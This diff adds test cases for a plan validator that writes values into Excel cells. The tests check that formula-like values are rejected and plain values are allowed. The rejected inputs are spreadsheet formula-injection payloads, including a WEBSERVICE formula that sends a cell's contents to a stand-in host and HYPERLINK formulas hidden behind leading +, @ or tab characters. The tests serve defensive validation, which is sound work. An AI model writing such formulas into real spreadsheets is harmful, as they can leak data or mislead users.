@@ -116,6 +116,43 @@ describe('validatePlan', () => {
     expect(() => validatePlan(raw, 'excel', 'sha256:range', new Date('2029-01-01')))
       .toThrowError(expect.objectContaining<Partial<PlanValidationError>>({ code: 'invalid_matrix' }))
   })
+
+  function valuesPlan(values: unknown[][]): unknown {
+    return {
+      planId: 'plan-4',
+      surface: 'excel',
+      expiresAt: future,
+      baseFingerprint: 'sha256:range',
+      summary: 'Update cells',
+      warnings: [],
+      actions: [{
+        type: 'set_selected_values',
+        anchor: { selectionHash: 'sha256:range', address: 'Sheet1!A1:B1' },
+        content: { values },
+      }],
+    }
+  }
+
+  it.each([
+    '=WEBSERVICE("https://x.example/?"&A1)',
+    '+HYPERLINK("https://x.example")',
+    '-2+3',
+    '@SUM(A1:A2)',
+    '=[Book1]Sheet1!A1',
+    '\t=HYPERLINK("https://x.example")',
+    '+1 555 0100',
+  ])('refuses formula-like Excel value %j', (value) => {
+    expect(() => validatePlan(valuesPlan([[1, value]]), 'excel', 'sha256:range', new Date('2029-01-01')))
+      .toThrowError(expect.objectContaining<Partial<PlanValidationError>>({ code: 'formula_in_values' }))
+  })
+
+  it.each([-5, 0, true, null, '-5', '+1.5', ' -1e3 ', 'Total = 12', '1-800-555-0100', ''])(
+    'allows plain Excel value %j',
+    (value) => {
+      const plan = validatePlan(valuesPlan([[value, 'Paid']]), 'excel', 'sha256:range', new Date('2029-01-01'))
+      expect(plan.actions[0]).toMatchObject({ type: 'set_selected_values', content: { values: [[value, 'Paid']] } })
+    },
+  )
 })
 
 describe('fingerprints', () => {
